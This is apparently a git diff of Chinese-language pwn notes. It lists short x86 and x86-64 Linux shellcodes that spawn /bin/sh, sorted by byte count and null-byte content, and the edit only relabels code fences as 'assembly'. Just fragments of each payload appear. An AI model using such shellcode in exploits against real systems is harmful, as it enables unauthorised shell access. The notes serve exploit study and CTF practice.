@@ -6,7 +6,7 @@
 
 有"\x00"最短 20 byte
 
-```
+```assembly
 shellcode= '''            
 xor ecx,ecx               
 mul ecx                   
@@ -21,7 +21,7 @@ shellcode=asm(shellcode)
 
 无"\x00"最短 21 byte
 
-```
+```assembly
 xor ecx,ecx
 mul ecx
 push eax
@@ -34,7 +34,7 @@ int 0x80
 
 标准shellcode 23 byte
 
-```
+```assembly
 xor ecx,ecx
 xor edx,edx
 push edx
@@ -50,7 +50,7 @@ int 0x80
 
 最短有"\x00" 22 byte
 
-```
+```assembly
 xor rsi,rsi
 mul esi
 mov rbx,0x68732f6e69622f
@@ -63,7 +63,7 @@ syscall
 
 最短无"\x00" 23 byte
 
-```
+```assembly
 xor rsi,rsi
 mul esi
 push rax
@@ -77,7 +77,7 @@ syscall
 
 标准shellcode 31 byte
 
-```
+```assembly
 xor    rdi,rdi
 xor    rsi,rsi
 xor    rdx,rdx
